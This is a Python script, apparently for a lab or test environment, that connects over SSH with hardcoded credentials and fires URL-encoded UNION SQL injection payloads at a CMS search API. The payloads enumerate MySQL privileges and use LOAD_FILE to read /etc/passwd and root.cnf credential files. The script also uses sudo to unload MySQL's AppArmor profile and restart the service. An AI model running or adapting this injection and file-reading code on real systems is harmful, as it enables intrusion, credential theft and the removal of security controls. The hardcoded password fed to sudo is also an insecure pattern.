#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Fix LOAD_FILE: grant FILE privilege, disable apparmor, test again"""
import paramiko
import sys

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

user = 'gdadmin'
pwd = 'Gdadmin@123'

def run(ssh, cmd, timeout=30):
    print(f">>> {cmd[:180]}")
    stdin, stdout, stderr = ssh.exec_command(cmd, timeout=timeout)
    out = stdout.read().decode('utf-8', errors='replace')
    err = stderr.read().decode('utf-8', errors='replace')
    ec = stdout.channel.recv_exit_status()
    if out.strip():
        try:
            print(f"  {out.strip()[:2000]}")
        except:
            print(f"  [output {len(out.strip())} chars]")
    if err.strip() and ec != 0:
        try:
            print(f"  [err] {err.strip()[:300]}")
        except:
            print(f"  [err suppressed]")
    return out, err, ec

c1 = paramiko.SSHClient()
c1.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c1.connect('192.168.100.1', username=user, password=pwd, timeout=10)

c2 = paramiko.SSHClient()
c2.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c2.connect('192.168.100.2', username=user, password=pwd, timeout=10)

# ============================================================
# 1. Check FILE privilege for cmsuser
# ============================================================
print("="*60)
print("1. CHECK FILE PRIVILEGE")
print("="*60)
# Via SQLi: check grants for current user
payload = "test%27%20UNION%20SELECT%201,GROUP_CONCAT(PRIVILEGE_TYPE),3,4%20FROM%20information_schema.USER_PRIVILEGES%20WHERE%20GRANTEE%20LIKE%200x25636d737573657225--%20%23"
run(c1, f"curl -s 'http://localhost/api.php/search?keyword={payload}' 2>&1")

# Check current user
payload2 = "test%27%20UNION%20SELECT%201,CURRENT_USER(),3,4%23"
run(c1, f"curl -s 'http://localhost/api.php/search?keyword={payload2}' 2>&1")

# Check all grants for cmsuser
payload3 = "test%27%20UNION%20SELECT%201,GROUP_CONCAT(GRANTEE,':',PRIVILEGE_TYPE),3,4%20FROM%20information_schema.USER_PRIVILEGES%20WHERE%20GRANTEE%20LIKE%20'%25cmsuser%25'%23"
run(c1, f"curl -s 'http://localhost/api.php/search?keyword={payload3}' 2>&1")

# ============================================================
# 2. Grant FILE privilege to cmsuser
# ============================================================
print("\n" + "="*60)
print("2. GRANT FILE PRIVILEGE")
print("="*60)

# We can't connect as root (password doesn't work). Let's check if we can sudo mysql
run(c2, "echo 'Gdadmin@123' | sudo -S mysql --protocol=SOCKET -S /var/run/mysqld/mysqld.sock -e 'SELECT \"OK\" as result;' 2>&1")

# Try without password
run(c2, "echo 'Gdadmin@123' | sudo -S mysql --defaults-file=/dev/null -e 'SELECT \"OK\" as result;' 2>&1")

# Check apparmor status
print("\n--- Check apparmor ---")
run(c2, "echo 'Gdadmin@123' | sudo -S aa-status 2>&1 | grep -i mysql | head -5")
run(c2, "echo 'Gdadmin@123' | sudo -S ls /etc/apparmor.d/*mysql* 2>/dev/null || echo 'no_mysql_apparmor'")

# If apparmor is blocking:
print("\n--- Disable apparmor for mysql ---")
run(c2, "echo 'Gdadmin@123' | sudo -S apparmor_parser -R /etc/apparmor.d/usr.sbin.mysqld 2>&1 || echo 'no_profile'")
run(c2, "echo 'Gdadmin@123' | sudo -S systemctl restart mysql 2>&1; echo RESTART_EXIT:$?")

# Wait
run(c2, "sleep 3; echo OK")

# ============================================================
# 3. Try LOAD_FILE again
# ============================================================
print("\n" + "="*60)
print("3. TEST LOAD_FILE AFTER FIXES")
print("="*60)

import codecs

# Test various paths
test_paths = [
    '/etc/hostname',
    '/etc/mysql/mysql.conf.d/root.cnf',
    '/var/lib/mysql-files/root.cnf',
    '/etc/passwd',
]

for path in test_paths:
    hex_path = '0x' + codecs.encode(path.encode(), 'hex').decode()
    payload = f"test%27%20UNION%20SELECT%201,LOAD_FILE({hex_path}),3,4%23"
    out, _, _ = run(c1, f"curl -s 'http://localhost/api.php/search?keyword={payload}' 2>&1")
    if 'null' in out.lower():
        print(f"  {path}: NULL")
    elif 'title' in out:
        import json
        try:
            data = json.loads(out)
            title = data.get('data', [{}])[0].get('title', 'NULL')
            if title:
                print(f"  {path}: SUCCESS! -> {title[:80]}")
            else:
                print(f"  {path}: NULL (empty)")
        except:
            print(f"  {path}: parse error: {out[:100]}")
    print()

# ============================================================
# 4. Check if we need to re-grant FILE via the SQLi itself
# ============================================================
print("\n" + "="*60)
print("4. GRANT FILE VIA SQLi (stacked queries check)")
print("="*60)
# MySQL/PHP mysqli supports stacked queries if multi_query is used
# But the code uses $mysqli->query() which does NOT support stacked queries
# So we can't GRANT via SQLi

# Alternative: Find another way to read files
# Maybe via the CONFIG table data or another endpoint

c1.close()
c2.close()
print("\nDone!")
